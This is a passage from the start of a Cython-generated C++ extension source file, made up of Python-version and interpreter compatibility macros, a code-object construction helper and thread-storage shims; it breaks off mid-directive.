

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif 
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef __cplusplus
  #error "Cython files generated with the C++ option must be compiled with a C++ compiler."
#endif
#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #else
    #define CYTHON_INLINE inline
  #endif
#endif
template<typename T>
void __Pyx_call_destructor(T& x) {
    x.~T();
}
template<typename T>
class __Pyx_FakeReference {
  public:
    __Pyx_FakeReference() : ptr(NULL) { }
    __Pyx_FakeReference(const T& ref) : ptr(const_cast<T*>(&ref)) { }
    T *operator->() { return ptr; }
    T *operator&() { return ptr; }
    operator T&() { return *ptr; }
    template<typename U> bool operator ==(U other) { return *ptr == other; }
    template<typename U> bool operator !=(U other) { return *ptr != other; }
  private:
    T *ptr;
};

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
